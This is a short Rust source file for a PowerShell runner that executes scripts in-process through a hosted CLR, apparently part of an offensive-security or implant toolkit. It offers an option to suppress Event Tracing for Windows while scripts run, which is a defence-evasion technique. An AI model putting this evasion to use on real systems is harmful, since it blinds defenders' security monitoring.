//! PowerShell inline execution entry.

use libra_common::dlog;
use libra_psinline;

pub struct PowerShellRunner;

impl PowerShellRunner {
    /// Execute PowerShell script in-process via the hosted CLR.
    #[allow(dead_code)]
    pub fn execute(script: &str, timeout_secs: u64) -> String {
        Self::execute_opts(script, timeout_secs, false)
    }

    pub fn execute_opts(script: &str, timeout_secs: u64, suppress_etw: bool) -> String {
        let preview: String = script.chars().take(160).collect();
        dlog!(
            "[powershell] execute_opts len={} suppress_etw={} script: {}",
            script.len(),
            suppress_etw,
            preview.replace('\n', "\\n")
        );
        let start = std::time::Instant::now();
        let result = libra_psinline::execute_inline_opts(script, timeout_secs, suppress_etw);
        dlog!(
            "[powershell] returned in {}ms: {}",
            start.elapsed().as_millis(),
            result
                .chars()
                .take(300)
                .collect::<String>()
                .replace('\n', "\\n")
        );
        result
    }
}
